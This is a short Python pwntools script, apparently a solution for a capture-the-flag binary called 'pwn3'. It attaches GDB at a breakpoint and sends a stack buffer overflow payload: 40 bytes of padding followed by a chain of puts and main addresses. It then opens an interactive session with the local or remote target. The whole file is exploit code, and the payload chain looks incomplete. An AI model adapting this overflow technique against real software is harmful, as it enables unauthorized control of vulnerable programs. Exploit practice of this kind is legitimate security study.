#!/usr/bin/python3

from pwn import *

exe = ELF('pwn3', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401218

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b"a" * 40 + p64(exe.sym['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
sla(b"flag?\n", payload)
p.interactive()
